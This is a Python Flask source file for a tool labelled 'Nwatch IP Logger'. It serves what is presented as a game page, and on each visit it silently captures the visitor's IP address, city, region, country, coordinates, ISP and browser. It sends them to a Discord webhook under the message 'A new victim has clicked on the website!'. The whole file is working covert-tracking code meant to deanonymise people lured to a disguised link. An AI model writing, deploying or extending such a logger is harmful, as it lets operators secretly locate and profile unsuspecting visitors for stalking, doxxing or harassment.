from flask import Flask, render_template, request, jsonify
import requests
from datetime import datetime
from ip_tracker import get_detailed_ip_info

app = Flask(__name__)

WEBHOOK_URL = "ENTER WEBHOOK" # interset link of webhook here


@app.route('/')
def index():
    log_visit()
    return render_template('index.html')


def log_visit():
    try:
        # Get visitor's real IP by checking various headers
        ip_address = request.headers.get(
            'X-Forwarded-For',
            request.headers.get('X-Real-IP', request.remote_addr))
        if ',' in ip_address:  # In case of multiple IPs in X-Forwarded-For
            ip_address = ip_address.split(',')[0].strip()

        ip_info = get_detailed_ip_info(ip_address)
        user_agent = request.headers.get('User-Agent')
        referrer = request.referrer
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Create rich embed for Discord
        embed = {
            "embeds": [{
                "title":
                "🎮 New Game Visit",
                "color":
                5814783,
                "description":
                "A new victim has clicked on the website!",
                "fields": [{
                    "name": "📍 IP Address",
                    "value": str(ip_info["ip"]),
                    "inline": True
                }, {
                    "name": "🌍 Location",
                    "value":
                    f"{ip_info.get('city', 'Unknown')}, {ip_info.get('region', 'Unknown')}, {ip_info.get('country', 'Unknown')}",
                    "inline": True
                }, {
                    "name": "🔌 ISP",
                    "value": str(ip_info.get("isp", "Unknown")),
                    "inline": True
                }, {
                    "name": "📍 Coordinates",
                    "value":
                    f"Lat: {ip_info.get('latitude', 'Unknown')}\nLong: {ip_info.get('longitude', 'Unknown')}",
                    "inline": True
                }, {
                    "name": "🌐 Browser",
                    "value": str(user_agent)[:1024],
                    "inline": False
                }, {
                    "name": "⏰ Time",
                    "value": timestamp,
                    "inline": True
                }],
                "footer": {
                    "text": "Nwatch IP Logger"
                }
            }]
        }

        response = requests.post(WEBHOOK_URL, json=embed)
        if response.status_code == 204:
            print("Data logged successfully!")
        else:
            print(f"Failed to log data. Status Code: {response.status_code}")

    except Exception as e:
        print(f"Error logging visit: {str(e)}")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)
